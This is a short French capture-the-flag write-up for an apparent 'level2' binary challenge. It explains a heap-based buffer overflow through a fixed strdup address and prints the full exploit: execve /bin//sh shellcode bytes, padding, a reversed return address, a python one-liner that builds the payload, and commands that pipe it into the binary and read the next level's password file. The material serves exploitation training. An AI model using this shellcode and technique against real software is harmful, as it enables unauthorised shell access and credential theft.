comment trouver le flag2

exactement comme le flag1 on a des gets() sauf qu'ils sont protege donc on va passer par la heap avec strdup

on va utiliser le debugger ltrace pour voir les adresses

peu importe la string rentree l'adresse de strdup reste la meme on va donc abuse de cette adresse (0x0804a008)

https://cdn.discordapp.com/attachments/1134141103768080415/1387083201066959030/image.png?ex=685c0d65&is=685abbe5&hm=309d029410c1879deb12ad6d9c7a8e358f44940807d1ac67dfcb8560d2b3f972&

pour executer "/bin//sh" et ouvrir un nouveau terminal le systeme fait toute ces instructions : \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80

on va donc utiliser /bin//sh + le remplir de 59 octets (avec des X) et ainsi executer sur l'adresse de strdup qui est 0x0804a008 : \x08\x04\xa0\x08

python -c "print '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 59 * 'X' + '\x08\x04\xa0\x08'[::-1]" > /tmp/overflow

cat /tmp/overflow - | ./level2

cat /home/user/level3/.pass

on a notre flag